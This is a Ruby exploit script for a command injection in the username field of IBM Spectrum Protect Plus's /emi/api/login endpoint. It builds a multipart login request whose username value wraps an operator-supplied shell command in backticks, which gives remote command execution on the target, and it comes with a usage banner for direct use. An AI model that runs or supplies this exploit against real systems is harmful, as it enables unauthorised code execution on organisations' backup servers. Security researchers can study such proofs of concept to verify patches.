#!/usr/bin/env ruby -W0
# Tested against 10.1.5
require 'rex'
require 'rex/mime'

host = ARGV[0]
cmd  = ARGV[1] || "echo dafuq > touch /tmp/mc.txt"

def usage
 puts "[*] IBM Spectrum Protect Plus username Remote Command Injection"
 puts "[*] #{$0} <host> [cmd]"
 exit
end

usage if ARGV.size < 1

begin

sock = Rex::Proto::Http::Client.new(host, 
                                    port = "8090", 
                                    context = {}, 
                                    ssl = true)

dbl = Rex::MIME::Message.new
dbl.add_part("product", nil, nil, "form-data; name=\"ltype\"")
dbl.add_part("__|`#{cmd}`", nil, nil, "form-data; name=\"username\"")
dbl.add_part("__", nil, nil, "form-data; name=\"password\"")
data = dbl.to_s

req = sock.request_cgi(
 {
  'uri'     => '/emi/api/login',
  'version' => '1.0',
  'method'  => 'POST',
  'ctype'   => "multipart/form-data; boundary=#{dbl.bound}",
  'data'    => data,
 })

sock.send_request(req)
data = sock.read_response()
rescue => e
puts "[!] #{e.to_s}"
end
